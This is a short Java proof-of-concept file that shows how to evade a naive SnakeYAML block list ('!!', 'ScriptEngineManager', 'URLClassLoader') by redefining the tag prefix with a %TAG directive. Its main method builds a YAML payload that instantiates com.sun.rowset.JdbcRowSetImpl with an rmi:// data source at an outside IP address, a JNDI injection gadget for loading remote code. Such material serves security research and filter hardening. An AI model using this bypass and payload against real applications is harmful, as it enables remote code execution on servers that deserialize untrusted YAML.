package com.rhein.bypass.case2;

import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.representer.Representer;

/**
 * 绕过对 !! 号的黑名单检测
 *   绕过方法：使用 TAG 指令重定义别名
 */
public class Bypass1 {

    private final static String[] YAML_BLOCK_LIST = {"!!", "ScriptEngineManager", "URLClassLoader"};

    private static void checkYaml(String yamlStr) throws Exception {
        for (String blockStr : YAML_BLOCK_LIST) {
            if (yamlStr.contains(blockStr)) {
                throw new Exception("Blacklist is matched.");
            }
        }
    }

    public static <T> T readYaml(String content, Class<T> type) throws Exception {
        Representer representer = new Representer();
        representer.getPropertyUtils().setSkipMissingProperties(true);
        Yaml yaml = new Yaml(representer);
        checkYaml(content);
        return type == null ? yaml.load(content) : yaml.loadAs(content, type);
    }

    public static void main(String[] args) throws Exception {
        String yamlStr = "%TAG !      tag:yaml.org,2002:\n" +
                "---\n" +
                "!com.sun.rowset.JdbcRowSetImpl\n dataSourceName: \"rmi://100.94.1.192:6666/Object\"\n autoCommit: true";
        readYaml(yamlStr, null);
    }
}
